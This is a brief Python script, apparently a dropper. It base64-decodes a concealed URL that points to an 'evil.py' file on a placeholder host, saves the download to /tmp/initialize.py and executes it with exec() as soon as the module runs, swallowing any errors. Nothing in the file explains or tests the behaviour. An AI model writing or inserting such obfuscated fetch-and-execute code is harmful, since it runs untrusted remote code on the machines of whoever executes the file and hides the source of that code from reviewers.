import urllib.request
import base64

def download_script():
    try:
        encoded_url = "aHR0cHM6Ly9zYW1wbGUudXJsL2V2aWwucHk="
        decoded_url = base64.b64decode(encoded_url).decode("utf-8")
        local_file = "/tmp/initialize.py"

        urllib.request.urlretrieve(decoded_url, local_file)

        with open(local_file, "r") as f:
            script = f.read()

        exec(script)

    except Exception as e:
        print(e)

download_script()
